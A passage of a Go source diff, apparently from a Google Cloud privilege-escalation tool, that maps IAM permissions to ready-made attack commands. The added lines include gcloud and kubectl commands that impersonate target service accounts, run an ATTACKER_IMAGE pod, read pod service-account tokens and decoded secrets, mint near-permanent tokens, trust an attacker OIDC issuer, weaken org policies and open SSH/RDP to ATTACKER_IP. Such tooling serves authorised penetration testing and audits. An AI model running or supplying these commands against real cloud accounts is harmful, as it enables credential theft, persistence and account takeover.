+		return fmt.Sprintf("gcloud scheduler jobs create http pwn-job --schedule='* * * * *' --uri=https://TARGET --oidc-service-account-email=TARGET_SA@%s.iam.gserviceaccount.com --project=%s", projectID, projectID)
+	case "cloudtasks.tasks.create":
+		return fmt.Sprintf("gcloud tasks create-http-task --queue=QUEUE --url=https://TARGET --oidc-service-account-email=TARGET_SA@%s.iam.gserviceaccount.com --project=%s", projectID, projectID)
+
+	// CI/CD
 	case "cloudbuild.builds.create":
-		return fmt.Sprintf("gcloud builds submit --config=cloudbuild.yaml --project=%s", projectID)
+		return fmt.Sprintf("gcloud builds submit --config=cloudbuild.yaml --project=%s  # cloudbuild.yaml runs as Cloud Build SA", projectID)
+	case "source.repos.update":
+		return fmt.Sprintf("gcloud source repos clone REPO --project=%s  # Modify code for build injection", projectID)
+
+	// Deployment Manager
+	case "deploymentmanager.deployments.create":
+		return fmt.Sprintf("gcloud deployment-manager deployments create pwn-deploy --config=config.yaml --project=%s  # config.yaml creates privileged resources", projectID)
+
+	// GKE
+	case "container.clusters.create":
+		return fmt.Sprintf("gcloud container clusters create pwn-cluster --service-account=TARGET_SA@%s.iam.gserviceaccount.com --zone=us-central1-a --project=%s", projectID, projectID)
+	case "container.clusters.getCredentials":
+		return fmt.Sprintf("gcloud container clusters get-credentials CLUSTER --zone=ZONE --project=%s", projectID)
+	case "container.pods.create":
+		return fmt.Sprintf("kubectl run pwn --image=ATTACKER_IMAGE --serviceaccount=TARGET_SA")
 	case "container.pods.exec":
-		return fmt.Sprintf("kubectl exec -it POD -- /bin/sh")
+		return "kubectl exec -it POD -- /bin/sh  # Then: cat /var/run/secrets/kubernetes.io/serviceaccount/token"
+	case "container.secrets.get":
+		return "kubectl get secret SECRET -o jsonpath='{.data}' | base64 -d"
+	case "container.serviceAccounts.createToken":
+		return "kubectl create token SERVICE_ACCOUNT --duration=999999h"
+
+	// Secrets
+	case "secretmanager.versions.access":
+		return fmt.Sprintf("gcloud secrets versions access latest --secret=SECRET_NAME --project=%s", projectID)
+
+	// Workload Identity Federation
+	case "iam.workloadIdentityPools.create":
+		return fmt.Sprintf("gcloud iam workload-identity-pools create pwn-pool --location=global --project=%s", projectID)
+	case "iam.workloadIdentityPoolProviders.create":
+		return fmt.Sprintf("gcloud iam workload-identity-pools providers create-oidc pwn-provider --location=global --workload-identity-pool=POOL --issuer-uri=https://ATTACKER --project=%s", projectID)
+
+	// Org Policies
+	case "orgpolicy.policy.set":
+		return fmt.Sprintf("gcloud org-policies set-policy policy.yaml --project=%s  # Disable constraints like requireOsLogin", projectID)
+
+	// SA Usage
+	case "iam.serviceAccounts.actAs":
+		return fmt.Sprintf("# Required alongside compute/serverless create permissions to attach SA")
+
+	// Network Access
+	case "iap.tunnelInstances.accessViaIAP":
+		return fmt.Sprintf("gcloud compute start-iap-tunnel INSTANCE PORT --zone=ZONE --project=%s", projectID)
+	case "compute.firewalls.create":
+		return fmt.Sprintf("gcloud compute firewall-rules create allow-attacker --network=default --allow=tcp:22,tcp:3389 --source-ranges=ATTACKER_IP/32 --project=%s", projectID)
+
 	default:
-		return fmt.Sprintf("# %s - refer to GCP documentation", permission)
+		return fmt.Sprintf("# %s - refer to GCP documentation for exploitation", permission)
 	}
 }
